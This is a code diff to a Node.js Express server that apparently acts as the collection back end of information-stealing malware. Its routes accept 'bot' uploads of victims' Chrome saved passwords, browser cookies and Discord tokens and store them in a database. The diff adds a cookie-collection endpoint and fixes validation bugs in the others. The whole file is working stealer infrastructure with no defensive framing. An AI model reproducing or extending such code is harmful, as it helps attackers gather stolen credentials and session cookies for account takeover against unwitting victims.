@@ -15,9 +15,8 @@ const storage = multer.diskStorage({
 const upload = multer({ storage: storage });
 
 module.exports = (application) => {
-    application.post("/update/details/:identifier", async (req, res) => {
-        const { identifier } = req.params;
-        const { token } = req.body;
+    application.post("/update/details/:identifier/:token", async (req, res) => {
+        const { identifier, token } = req.params;
         const postdata = req.body;
         if (identifier && token && Object.keys(postdata).length > 1) {
             const verify = await v.validate(identifier, token);
@@ -147,11 +146,10 @@ module.exports = (application) => {
         }
     );
 
-    application.post("/update/chrome/:identifier", async (req, res) => {
-        const { identifier } = req.params;
-        const { token } = req.body;
+    application.post("/update/chrome/:identifier/:token", async (req, res) => {
+        const { identifier, token } = req.params;
         const postdata = req.body;
-        if (identifier && token && Object.keys(postdata).length != 4) {
+        if (identifier && token && Object.keys(postdata).length == 3) {
             const verify = await v.validate(identifier, token);
             if (verify) {
                 db.Chrome.findAll({
@@ -163,7 +161,6 @@ module.exports = (application) => {
                     if (results.length > 0) {
                         db.Chrome.update(
                             {
-                                identifier: identifier,
                                 host: postdata.host,
                                 user: postdata.user,
                                 password: postdata.password,
@@ -204,10 +201,60 @@ module.exports = (application) => {
         }
     });
 
+    application.post("/update/cookies/:identifier/:token", async (req, res) => {
+        const { identifier, token } = req.params;
+        const { cookies } = req.body;
+        if (identifier && token && cookies) {
+            const verify = await v.validate(identifier, token);
+            if (verify) {
+                db.Cookies.findAll({
+                    where: {
+                        identifier: identifier,
+                    },
+                }).then((results) => {
+                    if (results.length > 0) {
+                        db.Cookies.update(
+                            {
+                                identifier: identifier,
+                                cookies: cookies,
+                            },
+                            {
+                                where: {
+                                    identifier: identifier,
+                                },
+                            }
+                        ).then(() => {
+                            res.status(200).json({
+                                message: "Cookie details updated",
+                            });
+                        });
+                    } else {
+                        db.Cookies.create({
+                            identifier: identifier,
+                            cookies: cookies,
+                        }).then(() => {
+                            res.status(200).json({
+                                message: "Cookie details updated",
+                            });
+                        });
+                    }
+                });
+            } else {
+                res.status(401).json({
+                    message: "Bot not found or token/id is invalid",
+                });
+            }
+        } else {
+            res.status(403).json({
+                message: "Missing token/id or not enough POST fields",
+            });
+        }
+    });
+
     application.post("/update/discord/:identifier/:token", async (req, res) => {
         const { identifier, token } = req.params;
         const { tokens } = req.body;
-        if (identifier && token && token) {
+        if (identifier && token && tokens) {
             const verify = await v.validate(identifier, token);
             if (verify) {
                 db.Discord.findAll({
